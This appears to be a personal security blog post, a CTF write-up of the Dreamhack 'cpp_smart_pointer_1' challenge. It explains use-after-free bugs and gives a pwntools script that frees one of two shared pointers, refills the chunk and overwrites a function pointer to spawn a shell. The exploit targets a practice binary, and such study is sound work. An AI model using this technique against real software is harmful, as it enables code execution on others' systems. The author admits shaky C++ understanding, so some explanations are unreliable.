@@ -1,0 +1,263 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Use After Free · whrds.log</title><meta name="description" content="Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code. Memory is allocated through malloc, etc., and freed through free.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-use-after-free/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-use-after-free/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-use-after-free/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Use After Free · whrds.log"><meta property="og:description" content="Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code. Memory is allocated through malloc, etc., and freed through free."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-use-after-free/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Use After Free","description":"Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code. Memory is allocated through malloc, etc., and freed through free.","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-use-after-free/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-use-after-free/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Use After Free</h1><p class="article-description">Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code. Memory is allocated through malloc, etc., and freed through free.</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>4 min read</span></div></header><div class="prose"><p>Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code.</p>
+<p>Memory is allocated through malloc, etc., and freed through free. Freed memory can be reused for other purposes. However, if the released pointer continues to be used, it is called <strong>Dangling Pointer</strong>.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/001.png" alt=""></p>
+<p>• <strong>Step 1</strong>: Memory allocation (malloc)</p>
+<p>• <strong>Step 2</strong>: Free memory</p>
+<p>• <strong>Step 3</strong>: Freed pointer is reused (Dangling Pointer)</p>
+<p>The data area of the allocated chunk corresponds to the header part of the freed chunk.</p>
+<p>In other words, the freed chunk regains the data area it was allocated at the time, excluding the fd and bk areas.</p>
+<p>And if you allocate a chunk of the same size, the freed chunk is allocated again, making it possible to access the previously existing data or the contents of fd and bk.</p>
+<hr>
+<h4>dreamhack cpp_smart_pointer_1</h4>
+<p>Since I don’t know C++ well, I couldn’t understand the code properly.</p>
+<pre><code>int main(){
+    initialize();
+    int selector = 0;
+    Smart *smart = new Smart();
+    std::shared_ptr&lt;Smart&gt; src_ptr(smart);
+    std::shared_ptr&lt;Smart&gt; new_ptr(smart);
+    while(1){
+        print_menu();
+        std::cin &gt;&gt; selector;
+        switch(selector){
+            case 1:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    change_pointer(src_ptr); // free
+                } else if(selector == 2){
+                    change_pointer(new_ptr);
+                }
+                break;
+            case 2:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    src_ptr.reset();
+                } else if(selector == 2){
+                    new_ptr.reset();
+                }
+                break;
+            case 3:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    (*src_ptr).fp();
+                } else if(selector == 2){
+                    (*new_ptr).fp();
+                }
+                break;
+            case 4:
+                write_guestbook();
+                break;
+            case 5:
+                view_guestbook();
+                break;
+            case 6:
+                return 0;
+                break;
+            default:
+                break;
+        }
+    }
+}
+</code></pre>
+<p>If you look at the main function, it functions to call a function using a switch statement, release the heap area, and execute new/src_ptr.fp().</p>
+<p>And if you look at the top, there are friends called smart/</p>
+<pre><code>Smart *smart = new Smart();
+std::shared_ptr&lt;Smart&gt; src_ptr(smart);
+std::shared_ptr&lt;Smart&gt; new_ptr(smart);
+</code></pre>
+<p>To be honest, this is something I still don’t fully understand.</p>
+<p>I know it’s a concept such as automatically pointing to arguments, but I haven’t handled it properly yet;;</p>
+<p>First of all, I don’t know much about the function, but the heap is allocated when each function is performed.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/002.png" alt=""></p>
+<p>Hmm… Let’s take a look at other function functions first.</p>
+<p>In case 1, a function called change_pointer is executed.</p>
+<pre><code>void change_pointer(std::shared_ptr&lt;Smart&gt; first){
+    int selector = 0;
+    std::cout &lt;&lt; &quot;1. apple\n2. banana\n3. mango&quot; &lt;&lt; std::endl;
+    std::cout &lt;&lt; &quot;select function for smart pointer: &quot;;
+    std::cin &gt;&gt; selector;
+    (*first).change_function(selector);
+    std::cout &lt;&lt; std::endl;
+}
+
+//구조체 코드 중 일부
+void change_function(int select){
+        if(select == 1){
+            fp = apple;
+        } else if(select == 2){
+            fp = banana;
+        } else if(select == 3){
+            fp = mango;
+        } else {
+            fp = apple;
+        }
+    }
+</code></pre>
+<p>This is the part that sets the functions for fp.</p>
+<p>The function of each fruit name is defined as follows.</p>
+<pre><code>void apple(){
+    std::cout &lt;&lt; &quot;Hi im apple!&quot; &lt;&lt; std::endl;
+}
+
+void banana(){
+    std::cout &lt;&lt; &quot;Hi im banana!&quot; &lt;&lt; std::endl;
+}
+
+void mango(){
+    std::cout &lt;&lt; &quot;Hi im mango!&quot; &lt;&lt; std::endl;
+}
+</code></pre>
+<p>Then, just make this fp point to the function that obtains the shell.</p>
+<pre><code>void getshell(){
+    std::cout &lt;&lt; &quot;Hi im shell!&quot; &lt;&lt; std::endl;
+    std::cout &lt;&lt; &quot;what? shell?&quot; &lt;&lt; std::endl;
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>In case 2, reset is being performed.</p>
+<pre><code>case 2:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    src_ptr.reset();
+                } else if(selector == 2){
+                    new_ptr.reset();
+                }
+                break;
+</code></pre>
+<p>I looked it up and found that it has a free function;;;</p>
+<p>In case 3, the function in fp of the structure is executed.</p>
+<pre><code>case 3:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    (*src_ptr).fp();
+                } else if(selector == 2){
+                    (*new_ptr).fp();
+                }
+                break;
+</code></pre>
+<p>In case 4, the write_guestbook function is called.</p>
+<pre><code>void write_guestbook(){
+    std::string data;
+    std::cout &lt;&lt; &quot;write guestbook : &quot;;
+    std::cin &gt;&gt; data;
+    guest_book = (char *)malloc(data.length() + 1);
+    strcpy(guest_book, data.c_str());
+}
+</code></pre>
+<p>Hmm… It seems like allocating the heap area with malloc and entering the value in the data part.</p>
+<p>In case 5, view_guestbook is called.</p>
+<pre><code>void view_guestbook(){
+    std::cout &lt;&lt; &quot;guestbook data: &quot;;
+    std::cout &lt;&lt; guest_book &lt;&lt; std::endl;
+}
+
+//전역변수
+char* guest_book = &quot;guestbook\x00&quot;;
+</code></pre>
+<p>Prints the value in guest_book.</p>
+<p>The vulnerability occurs in case 2.</p>
+<pre><code>Smart *smart = new Smart();
+std::shared_ptr&lt;Smart&gt; src_ptr(smart);
+std::shared_ptr&lt;Smart&gt; new_ptr(smart);
+
+...
+
+case 2:
+                std::cout &lt;&lt; &quot;Select pointer(1, 2): &quot;;
+                std::cin &gt;&gt; selector;
+                if(selector == 1){
+                    src_ptr.reset();
+                } else if(selector == 2){
+                    new_ptr.reset();
+                }
+                break;
+</code></pre>
+<p>First of all, if the samrt pointer points to the same memory, a uaf or double free vulnerability occurs when only one or both are freed.</p>
+<p>And in case 2, one of the two can be released.</p>
+<p>In other words, when you free src_ptr, you can access the freed area through new_ptr.</p>
+<p>If this is correct, it frees one of the two pointers and mallocs it again, exploiting the uaf vulnerability.</p>
+<p>To be honest, I’m still not sure if it’s because it’s a cpp, but I’m not sure if it’s smart and the heap is allocated.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/003.png" alt=""></p>
+<p>What is certain is that the two pointers created later have the same area, 0x616eb0.</p>
+<p>0x402300 seems to refer to a smart pointer.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/004.png" alt=""></p>
+<p>And if you check the area, it contains the address of a function called apple.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/005.png" alt=""></p>
+<p>Now let’s release one of the two pointers.</p>
+<p>I only freed src_ptr, but smart was also freed.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/006.png" alt=""></p>
+<p>If you check the memory, the two ptr’s still point to smart.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/007.png" alt=""></p>
+<p>One of the two is free. </p>
+<p>Here, we will reassign src_ptr.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/008.png" alt=""></p>
+<p>smart has not been allocated yet, but src_ptr appears to have been allocated.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/009.png" alt=""></p>
+<p>The value was entered normally.</p>
+<p>Here is what it looks like once again.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/010.png" alt=""></p>
+<p>It looks like it has even gone smart.</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/011.png" alt=""></p>
+<p>If you check the value, you will see that the value you entered was entered correctly.</p>
+<p>Since 0x606ea0 is a smart structure area, if the address of a function called getshell is entered in that data area,</p>
+<p>You will get a shell when you call fp() on the structure.</p>
+<pre><code>from pwn import*
+
+p = process('./cpp_smart_pointer_1')
+e = ELF('cpp_smart_pointer_1')
+
+pause()
+p.sendlineafter(': ', '2')
+p.sendlineafter(': ', '1')
+
+pause()
+p.sendlineafter(': ', '4')
+p.sendlineafter(': ', 'a'*8)
+
+pause()
+p.sendlineafter(': ', '4')
+p.sendlineafter(': ', p32(0x40161d))
+
+pause()
+p.sendlineafter(': ', '3')
+p.sendlineafter(': ', '2')
+
+p.interactive()
+</code></pre>
+<p>This is the entire payload. If you run it, you can get a shell like this:</p>
+<p><img src="/assets/images/tistory/tistory-2656f66a8685/012.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-use-after-free/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
